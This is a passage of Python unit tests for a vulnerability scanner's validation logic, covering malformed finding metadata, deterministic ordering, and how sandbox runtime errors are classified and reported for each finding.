        dast_validated_findings=["HRP_0_0", "HRP_0_1"],
        journal_records=[],
        findings_validated_meta={
            "HRP_0_0": "not a dict",  # malformed
            "HRP_0_1": {
                "finding_ref": "HRP_0_1",
                "finding_type": "ssrf",
                "severity": "high",
                "cwe": "CWE-918",
            },
        },
    )
    # Only HRP_0_1 surfaces; HRP_0_0 silently skipped.
    assert len(out) == 1
    assert out[0].finding_id == "HRP_0_1"


def test_hrp_meta_emits_deterministic_order() -> None:
    """Sorted ordering keeps test output / scan-result diffs stable
    when multiple HRP findings exist."""
    out = derive_per_finding_validation(
        l1_vulnerabilities=[],
        dast_validated_findings=["HRP_0_1", "HRP_0_0", "HRP_AL_T0_H1"],
        journal_records=[],
        findings_validated_meta={
            "HRP_0_1": {"finding_ref": "HRP_0_1", "finding_type": "x", "severity": "low", "cwe": ""},
            "HRP_0_0": {"finding_ref": "HRP_0_0", "finding_type": "y", "severity": "low", "cwe": ""},
            "HRP_AL_T0_H1": {"finding_ref": "HRP_AL_T0_H1", "finding_type": "z", "severity": "low", "cwe": ""},
        },
    )
    ids = [pf.finding_id for pf in out]
    # Sorted alphabetically — HRP_0_0 < HRP_0_1 < HRP_AL_T0_H1.
    assert ids == ["HRP_0_0", "HRP_0_1", "HRP_AL_T0_H1"]



# ── v15.8 sandbox stderr surfacing + runtime_error classification ────────


def test_classify_runtime_error_detects_attribute_error() -> None:
    """The classifier matches Python exception names in stderr text."""
    assert _classify_runtime_error("AttributeError: module foo has no attribute bar")
    assert _classify_runtime_error("ModuleNotFoundError: No module named 'ruamel'")
    assert _classify_runtime_error("Traceback (most recent call last):\n  File '<string>', line 1")
    assert _classify_runtime_error("TypeError: 'str' object is not callable")
    # Case-insensitive
    assert _classify_runtime_error("typeerror: foo")


def test_classify_runtime_error_does_not_match_benign_text() -> None:
    """Refutation rationales and clean stderrs do not flag as runtime errors."""
    assert not _classify_runtime_error("")
    assert not _classify_runtime_error("validator rejected: input is sanitized via shlex.quote")
    assert not _classify_runtime_error("probe ran, no exploit signal")
    assert not _classify_runtime_error("exec returned 0, no canary")


def test_index_sandbox_stderr_extracts_from_sandbox_exec_records() -> None:
    """v15.8: pull the sandbox stderr for each H### out of SANDBOX_EXEC entries."""
    journal = [
        {
            "claim_id": "H001",
            "phase": "sandbox_exec",
            "rationale": "AttributeError: module ruamel.yaml has no attribute 'load'",
        },
        {
            "claim_id": "H001",
            "phase": "phase_a_verdict",
            "rationale": "judge said something",
            "verdict": "inconclusive",
        },
    ]
    out = _index_sandbox_stderr_by_finding(journal)
    assert "H001" in out
    assert "AttributeError" in out["H001"]


def test_derive_promotes_to_runtime_error_when_stderr_has_traceback() -> None:
    """v15.8: when the sandbox stderr for an H### contains a Python
    runtime error, the per-finding validation is reclassified as
    NOT_TESTED with not_tested_reason='runtime_error' and the real
    stderr is surfaced in rejection_reason.

    Reproduces the ruamel-yaml H001 case: judge hallucinated
    'No module named ruamel' when reality was an AttributeError
    on a removed legacy API.
    """
    l1 = [{"cwe": "CWE-502", "confidence": 0.9}]
    journal = [
        {
            "claim_id": "H001",
            "phase": "sandbox_exec",
            "rationale": (
                "Traceback (most recent call last):\n"
                "  File '/workspace/_argus_h001.py', line 1, in <module>\n"
                "AttributeError: module 'ruamel.yaml' has no attribute 'load'"
            ),
        },
        {
            "claim_id": "H001",
            "phase": "phase_a_verdict",
            "verdict": "inconclusive",
            "rationale": (
                "The sandbox attempted the PoC but could not run it — "
                "No module named 'ruamel'."
            ),
        },
    ]
    out = derive_per_finding_validation(
        l1_vulnerabilities=l1,
        dast_validated_findings=[],
        journal_records=journal,
    )
    assert len(out) == 1
    pfv = out[0]
    assert pfv.status == "NOT_TESTED"
    assert pfv.not_tested_reason == "runtime_error"
    # Real stderr must be in rejection_reason, not just the judge text.
    assert "AttributeError" in (pfv.rejection_reason or "")
    assert "[sandbox stderr]" in (pfv.rejection_reason or "")


def test_derive_runtime_error_promotion_skips_when_status_is_confirmed() -> None:
    """v15.8 boundary: a CONFIRMED finding cannot be demoted to
    runtime_error even if stderr noise contains an exception name —
    DAST already produced a meaningful signal."""
    l1 = [{"cwe": "CWE-94", "confidence": 0.9}]
    journal = [
        {
            "claim_id": "H001",
            "phase": "sandbox_exec",
            "rationale": "AttributeError on cleanup path (after success)",
        },
        {
            "claim_id": "H001",
            "phase": "phase_a_verdict",
            "verdict": "confirmed",
            "rationale": "canary file appeared at /tmp/argus_pwned",
        },
    ]
    out = derive_per_finding_validation(
        l1_vulnerabilities=l1,
        dast_validated_findings=[],
        journal_records=journal,
    )
    assert out[0].status == "CONFIRMED"
    assert out[0].not_tested_reason is None

